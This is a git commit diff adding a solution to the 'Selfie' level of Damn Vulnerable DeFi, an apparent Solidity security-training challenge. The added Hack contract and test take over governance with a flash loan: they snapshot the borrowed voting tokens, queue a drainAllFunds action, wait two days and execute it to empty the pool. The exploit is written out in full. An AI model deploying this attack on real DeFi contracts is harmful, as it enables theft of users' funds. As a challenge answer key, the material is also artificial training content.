52f62bff01754ed453ecea6f8543ceee719e99b1
Aboudoc <aboutika.reda@gmail.com>
2023-06-07 07:00:06 +0200

    selfie

--- test/Levels/selfie/Selfie.t.sol
+++ test/Levels/selfie/Selfie.t.sol
@@ -8,6 +8,46 @@ import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableToke
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
+///////////////////////
+// Hack contract
+///////////////////////
+
+contract Hack {
+    SelfiePool public selfiePool;
+    SimpleGovernance public simpleGovernance;
+    DamnValuableTokenSnapshot public dvt;
+    uint256 actionId;
+
+    constructor(address _pool, address _governance, address _token) {
+        selfiePool = SelfiePool(_pool);
+        simpleGovernance = SimpleGovernance(_governance);
+        dvt = DamnValuableTokenSnapshot(_token);
+    }
+
+    fallback() external payable {
+        dvt.snapshot();
+        bytes memory data = abi.encodeWithSelector(SelfiePool.drainAllFunds.selector, address(this));
+        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
+
+        dvt.transfer(address(selfiePool), dvt.balanceOf(address(this)));
+    }
+
+    function attack() external {
+        //uint256 amount = dvt.balanceOf(address(selfiePool));
+        selfiePool.flashLoan(dvt.balanceOf(address(selfiePool)));
+    }
+
+    function drain() external {
+        simpleGovernance.executeAction(actionId);
+        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
+    }
+
+}
+
+//////////////////////
+// Tests
+//////////////////////
+
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
     uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
@@ -47,6 +87,15 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startBroadcast(attacker);
+        Hack hack = new Hack(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
+        hack.attack();
+
+        vm.warp(block.timestamp + 2 days); 
+
+        hack.drain();
+
+        vm.stopBroadcast();
 
         /**
          * EXPLOIT END *
